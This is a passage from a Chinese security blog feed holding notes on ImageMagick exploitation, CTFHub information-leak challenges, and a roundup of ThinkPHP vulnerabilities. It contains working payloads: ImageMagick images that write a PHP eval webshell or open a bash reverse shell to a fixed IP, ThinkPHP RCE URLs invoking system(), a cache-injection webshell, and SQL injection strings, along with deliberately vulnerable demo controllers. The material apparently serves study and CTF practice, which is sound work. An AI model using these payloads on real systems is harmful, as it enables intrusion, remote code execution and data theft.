title="ImageMagick"></a>ImageMagick</h1><p>imagemagick是一个用于处理图片的程序，如果上传的图片含有攻击代码，在处理时可被远程执行任意代码（CVE-2016–3714）<br>写一句话到网站根目录下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill <span class="string">'url(https://example.com/1.jpg"|echo \'</span>&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[\<span class="string">'ant\'</span>]);?&gt;\<span class="string">' &gt; shell.php")'</span></span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p>反弹 shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill <span class="string">'url(https://example.com/1.jpg"|bash -i &gt;&amp; /dev/tcp/192.168.1.101/2333 0&gt;&amp;1")'</span></span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p>参考文章：<br><a href="https://writeup.ctfhub.com/Skill/Web%E8%BF%9B%E9%98%B6/PHP/Bypass-disable-function/3d4335ed.html" target="_blank" rel="noopener">https://writeup.ctfhub.com/Skill/Web%E8%BF%9B%E9%98%B6/PHP/Bypass-disable-function/3d4335ed.html</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/109078117" target="_blank" rel="noopener">https://blog.csdn.net/rfrder/article/details/109078117</a> </p><p><a href="https://www.anquanke.com/post/id/208451" target="_blank" rel="noopener">https://www.anquanke.com/post/id/208451</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;PHP 的 disable_functions 用于禁用一些危险的函数避免被攻击者利用  &lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>CTFHub学习</title>
    <link href="https://blog.cfyqy.com/article/113c40a3.html"/>
    <id>https://blog.cfyqy.com/article/113c40a3.html</id>
    <published>2020-12-18T15:39:20.000Z</published>
    <updated>2021-01-06T09:21:57.056Z</updated>
    
    <content type="html"><![CDATA[<p>CTFHub题目学习</p><a id="more"></a><h1 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h1><h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><p>git相关命令 <a href="https://blog.csdn.net/weixin_45254208/article/details/107810572" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45254208/article/details/107810572</a>  </p><h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><p>解法一：<br>git_extract.py直接出结果 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 git_extract.py http://challenge-15f179a684f3a620.sandbox.ctfhub.com:10080/.git/</span><br></pre></td></tr></table></figure><p>解法二：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py</span><br><span class="line">http://challenge-3d5f95fbd136fa99.sandbox.ctfhub.com:10080/.git</span><br></pre></td></tr></table></figure><p>git log查看提交历史<br>版本回滚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 349eb2df182641950bf27a24df6dc3c8c52fd9c3</span><br></pre></td></tr></table></figure><h3 id="stash"><a href="#stash" class="headerlink" title="stash"></a>stash</h3><p>解法一：<br>git_extract.py直接出结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 git_extract.py http://challenge-ea20b24a0fde9085.sandbox.ctfhub.com:10080/.git/</span><br></pre></td></tr></table></figure><p>解法二：<br>GitHack.py 得文件<br>执行 git stash list 发现 stash<br>执行 git stash pop 发现从 git 栈中弹出来一个包含flag的文件  </p><p>版本回滚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 349eb2df182641950bf27a24df6dc3c8c52fd9c3</span><br></pre></td></tr></table></figure><h3 id="index"><a href="#index" class="headerlink" title="index"></a>index</h3><h2 id="svn"><a href="#svn" class="headerlink" title="svn"></a>svn</h2><p>Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。</p><p>安装perl组件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</span><br><span class="line">`</span><br></pre></td></tr></table></figure><p>然后需要安装svn服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install subversion</span><br></pre></td></tr></table></figure><p>gitclone: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/kost/dvcs-ripper</span><br></pre></td></tr></table></figure><p>下载解压后进入dvcs-ripper工具目录，然后给权限：chmod 755 *<br>进入目录<br>用 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rip-svn.pl -v -u http://challenge-fb13f9afd9ee3b28.sandbox.ctfhub.com:10080/.svn/</span><br></pre></td></tr></table></figure><p>得到的还原目录数据在.svn目录下，需要ls -al查看 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">svn1.6及以前版本会在项目的每个文件夹下都生成一个.svn文件夹，里面包含了所有文件的备份，文件名为 .svn/text-base/文件名.svn-base</span><br><span class="line">svn1.7及以后版本则只在项目根目录生成一个.svn文件夹，里面的pristine文件夹里包含了整个项目的所有文件备份</span><br></pre></td></tr></table></figure><p>这是缺少perl模块的报错<br>我这里提示我缺少的是 SQLite 所以下 SQLite 具体下载什么看提示</p><p>执行需要root权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">perl -MCPAN -e shell</span><br><span class="line">install DBD::SQLite</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><h2 id="HG"><a href="#HG" class="headerlink" title="HG"></a>HG</h2><p>脚本：dvcs-ripper-master</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./rip-hg.pl -v -u http://challenge-6b91e8ced3bbc632.sandbox.ctfhub.com:10080/.hg/</span><br></pre></td></tr></table></figure><p>进入.hg目录，并寻找flag </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ye1s@kali:~/Desktop/tool/dvcs-ripper/.hg$ sudo grep -r <span class="string">"flag"</span> ./</span><br><span class="line">Binary file ./undo.dirstate matches</span><br><span class="line">./last-message.txt:add flag</span><br><span class="line">Binary file ./store/undo matches</span><br><span class="line">./store/fncache:data/flag_2646614128.txt.i</span><br><span class="line">Binary file ./store/00manifest.i matches</span><br></pre></td></tr></table></figure><p>查看.hg/store/fncache可知 flag 的文件名为flag_88274161.txt，直接访问即可得 flag</p><h2 id="备份文件"><a href="#备份文件" class="headerlink" title="备份文件"></a>备份文件</h2><h3 id="网站备份"><a href="#网站备份" class="headerlink" title="网站备份"></a>网站备份</h3><p>拿disearch扫一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://challenge-d7b90efa6684f0b0.sandbox.ctfhub.com:10080/ -e *</span><br></pre></td></tr></table></figure><p>url访问flag_235451560.txt,得到flag</p><h3 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h3><p>题目提示Flag in index.php source code</p><p>访问index.php.bak下载得到源码，flag在源码里</p><h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><p>​ 程序员使用vim编辑器编写一个index.php文件时，会有一个.index.php.swp文件，如果文件正常退出，则该文件被删除，如果异常退出，该文件则会保存下来<br>在Linux里通过命令 vim -r xxx.swp 来让临时文件恢复正常 </p><p>访问.index.php.swp,下载文件，记事本打开，Ctrl+F搜索ctfhub得到flag</p><h3 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h3><p>.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。如果开发/设计人员在发布代码时未删除文件夹中隐藏的.DS_store，则有可能会造成文件泄露</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 ds_store_exp.py http://challenge-ade6b89566c8695c.sandbox.ctfhub.com:10080/.DS_Store</span><br></pre></td></tr></table></figure><h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p>phpinfo.php<br>搜索ctfhub{</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CTFHub题目学习&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>thinkphp学习</title>
    <link href="https://blog.cfyqy.com/article/b96f5dfe.html"/>
    <id>https://blog.cfyqy.com/article/b96f5dfe.html</id>
    <published>2020-12-15T16:24:43.000Z</published>
    <updated>2021-01-14T01:14:17.704Z</updated>
    
    <content type="html"><![CDATA[<p>thinkphp 漏洞的汇总     </p><a id="more"></a><h1 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think tp500 5.0.0 --prefer-dist</span><br></pre></td></tr></table></figure><p>修改项目根目录下的 composer.json 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"require"</span>: &#123;</span><br><span class="line"><span class="string">"topthink/framework"</span>: <span class="string">"5.1.6"</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再更新项目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure><h1 id="5-0-0-5-0-23-RCE"><a href="#5-0-0-5-0-23-RCE" class="headerlink" title="5.0.0~5.0.23 RCE"></a>5.0.0~5.0.23 RCE</h1><p>问题的根源在于请求方法的获取接收了不可信数据,Request类的变量被覆盖导致RCE    </p><p>以 thinkphp 5.0.22 完整版为例，下载地址：<a href="http://www.thinkphp.cn/down/1260.html" target="_blank" rel="noopener">http://www.thinkphp.cn/down/1260.html</a><br>exp1:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp/thinkphp_5.0.22_with_extend/public/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br></pre></td></tr></table></figure><p>exp2:    </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp/thinkphp_5.0.22_with_extend/public/index.php?s=<span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure><p>漏洞分析详情可看 <a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener">ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析</a></p><h1 id="3-2-3-5-0-10-缓存类RCE"><a href="#3-2-3-5-0-10-缓存类RCE" class="headerlink" title="3.2.3~5.0.10 缓存类RCE"></a>3.2.3~5.0.10 缓存类RCE</h1><p>漏洞利用条件：<br>1.基于tp5开发的代码中使用了Cache::set 进行缓存<br>2.在利用版本范围内<br>3.runtime目录可以访问</p><p>详情可看:<a href="https://paper.seebug.org/374/" target="_blank" rel="noopener">https://paper.seebug.org/374/</a><br>漏洞形成原因对传入的value没有过滤，序列化后直接保存到文件里，可以用<code>%0d%0a</code>进行换行摆脱序列化，用注释符//注释掉后面的字符。  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 写入缓存</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string    $name 缓存变量名  md5(键名)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mixed     $value  存储数据  键值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> int       $expire  有效时间 0为永久</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> boolean</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name, $value, $expire = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">            $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">'expire'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;tag &amp;&amp; !is_file($filename)) &#123;</span><br><span class="line">            $first = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $data = serialize($value);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'data_compress'</span>] &amp;&amp; function_exists(<span class="string">'gzcompress'</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $data   = <span class="string">"&lt;?php\n//"</span> . sprintf(<span class="string">'%012d'</span>, $expire) . $data . <span class="string">"\n?&gt;"</span>;</span><br><span class="line">        $result = file_put_contents($filename, $data);</span><br><span class="line">        <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">            <span class="keyword">isset</span>($first) &amp;&amp; <span class="keyword">$this</span>-&gt;setTagItem($filename);</span><br><span class="line">            clearstatcache();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>环境搭建<br>首先要有缓存操作文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Cache</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Cache::set(<span class="string">"name"</span>,input(<span class="string">"get.username"</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Cache success'</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问该页面并写入shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/tp/<span class="keyword">public</span>/index.php/index/index/index?username=syst1m%<span class="number">0</span>d%<span class="number">0</span>a@<span class="keyword">eval</span>($_GET[_]);<span class="comment">//</span></span><br></pre></td></tr></table></figure><p><img src="../../images/php/thinkphp/1.png" alt=""></p><p>分析源码可知,缓存文件默认保存在/runtime/cache/目录下，程序先获得键名（name）的 md5 值，然后将该 md5 值的前 2 个字符作为缓存子目录，后 30 字符作为缓存文件名，<code>md5(&#39;name&#39;)=b068931cc450442b63f5b3d276ea4297</code>,所以缓存文件的访问路径为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/tp/runtime/cache/b0/68931cc450442b63f5b3d276ea4297.php</span></span><br></pre></td></tr></table></figure><h1 id="5-0-7-5-0-22未开启强制路由导致rce"><a href="#5-0-7-5-0-22未开启强制路由导致rce" class="headerlink" title="5.0.7~5.0.22未开启强制路由导致rce"></a>5.0.7~5.0.22未开启强制路由导致rce</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?s=index/think\config/get&amp;name=database.username <span class="comment"># 获取配置信息</span></span><br><span class="line">?s=index/\think\Lang/load&amp;file=../../test.jpg    <span class="comment"># 包含任意文件</span></span><br><span class="line">?s=index/\think\Config/load&amp;file=../../t.php     <span class="comment"># 包含任意.php文件</span></span><br><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br></pre></td></tr></table></figure><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>tp5的注入都比较鸡肋，不能进行子查询，tp3的可以  </p><h2 id="ThinkPHP-5-0-9-鸡肋SQL注入"><a href="#ThinkPHP-5-0-9-鸡肋SQL注入" class="headerlink" title="ThinkPHP 5.0.9 鸡肋SQL注入"></a>ThinkPHP 5.0.9 鸡肋SQL注入</h2><p><a href="https://xz.aliyun.com/t/2812" target="_blank" rel="noopener">https://xz.aliyun.com/t/2812</a><br>只能通过报错获取类似于database()、user()这类信息，而不支持子查询   </p><p>环境：<br><a href="https://github.com/vulhub/vulhub/tree/master/thinkphp/in-sqlinjection/www" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/thinkphp/in-sqlinjection/www</a><br>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $ids = input(<span class="string">'ids/a'</span>);</span><br><span class="line">    $t = <span class="keyword">new</span> User();</span><br><span class="line">    $result = $t-&gt;where(<span class="string">'id'</span>, <span class="string">'in'</span>, $ids)-&gt;select();</span><br><span class="line">    <span class="keyword">foreach</span>($result <span class="keyword">as</span> $row) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Hello, &#123;$row['username']&#125;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ThinkPHP-5-0-15-update-insert-注入"><a href="#ThinkPHP-5-0-15-update-insert-注入" class="headerlink" title="ThinkPHP 5.0.15 update/insert 注入"></a>ThinkPHP 5.0.15 update/insert 注入</h2><p>环境：<br>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $username = input(<span class="string">'get.username/a'</span>);</span><br><span class="line">    $res = db(<span class="string">'user'</span>)-&gt;where([<span class="string">'id'</span>=&gt; <span class="number">1</span>])-&gt;insert([<span class="string">'username'</span>=&gt;$username]);</span><br><span class="line">    var_dump($res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/tp5.0.15/public/index.php</span><br><span class="line">?username[0]=inc</span><br><span class="line">&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)</span><br><span class="line">&amp;username[2]=1</span><br></pre></td></tr></table></figure><h2 id="ThinkPHP-3-2-3-where注入"><a href="#ThinkPHP-3-2-3-where注入" class="headerlink" title="ThinkPHP 3.2.3 where注入"></a>ThinkPHP 3.2.3 where注入</h2><p>下载3.2.3版本的ThinkPHP，在IndexController.class.php中创建一个demo</p><p>public function index(){<br>    $data = M(‘user’)-&gt;find(I(‘GET.id’));<br>    var_dump($data);<br>}<br>下载3.2.3版本的ThinkPHP，在IndexController.class.php中创建一个demo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $data = M(<span class="string">'user'</span>)-&gt;find(I(<span class="string">'GET.id'</span>));</span><br><span class="line">    var_dump($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/tp323/index.php?id[<span class="built_in">where</span>]=3 and 1=updatexml(1,concat(0x7,(select password from user <span class="built_in">limit</span> 1),0x7e),1)%23</span><br></pre></td></tr></table></figure><h2 id="ThinkPHP-3-2-3-bind-注入"><a href="#ThinkPHP-3-2-3-bind-注入" class="headerlink" title="ThinkPHP 3.2.3 bind 注入"></a>ThinkPHP 3.2.3 bind 注入</h2><p>demo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $User = M(<span class="string">"user"</span>);</span><br><span class="line">    $user[<span class="string">'id'</span>] = I(<span class="string">'id'</span>);</span><br><span class="line">    $data[<span class="string">'username'</span>] = I(<span class="string">'username'</span>);</span><br><span class="line">    $data[<span class="string">'password'</span>] = I(<span class="string">'password'</span>);</span><br><span class="line">    $valu = $User-&gt;where($user)-&gt;save($data);</span><br><span class="line">    var_dump($valu);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="5-1未开启强制路由导致的RCE"><a href="#5-1未开启强制路由导致的RCE" class="headerlink" title="5.1未开启强制路由导致的RCE"></a>5.1未开启强制路由导致的RCE</h1><p>thinkphp默认没有开启强制路由<br>说明我们可以使用路由兼容模式 s 参数，而框架对控制器名没有进行足够的检测，说明可能可以调用任意的控制器任意方法来执行，<br>eg: <a href="http://site/?s=模块/控制器/方法" target="_blank" rel="noopener">http://site/?s=模块/控制器/方法</a><br>poc1<br>详情可看 <a href="https://www.cnblogs.com/wangtanzhi/p/12715255.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12715255.html</a>    </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/tp5117/public/index.php?s=index/\think\Request/input&amp;filter[]=system&amp;data=whoami</span><br></pre></td></tr></table></figure><p>poc2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/tp5117/public/index.php?s=index/\think\Container/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure><h1 id="Thinkphp5-1-5-2-全版本代码执行"><a href="#Thinkphp5-1-5-2-全版本代码执行" class="headerlink" title="Thinkphp5.1 ~ 5.2 全版本代码执行"></a>Thinkphp5.1 ~ 5.2 全版本代码执行</h1><p><a href="https://www.secpulse.com/archives/95952.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/95952.html</a></p><p>环境：<br>需要在index.php 中添加error_reporting(0);，要不会报filter错误   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加载基础文件</span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/../thinkphp/base.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 支持事先使用静态方法设置Request对象和Config对象</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 执行应用并响应</span></span><br><span class="line">Container::get(<span class="string">'app'</span>)-&gt;run()-&gt;send();</span><br></pre></td></tr></table></figure><p>利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/tp5117/public/index.php</span><br><span class="line">post:c=system&amp;f=calc.exe&amp;_method=filter</span><br></pre></td></tr></table></figure><h1 id="thinkphp6-0-0-6-0-1-任意文件操作"><a href="#thinkphp6-0-0-6-0-1-任意文件操作" class="headerlink" title="thinkphp6.0.0-6.0.1 任意文件操作"></a>thinkphp6.0.0-6.0.1 任意文件操作</h1><p>利用条件:    </p><ul><li>ThinkPHP6.0.0-6.0.1</li><li>开启Sessoin中间件</li></ul><p>漏洞复现<br>官方commit: <a href="https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2</a></p><p>复现环境为:phpstudy+thinkphp6.0.1</p><p>\app\controller\index.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">facade</span>\<span class="title">Session</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Session::set(<span class="string">'name'</span>, $name);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'hello,'</span> . Session::get(<span class="string">'name'</span>);;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>\app\middleware.php</p><figure class="highlight php"><table><tr><td 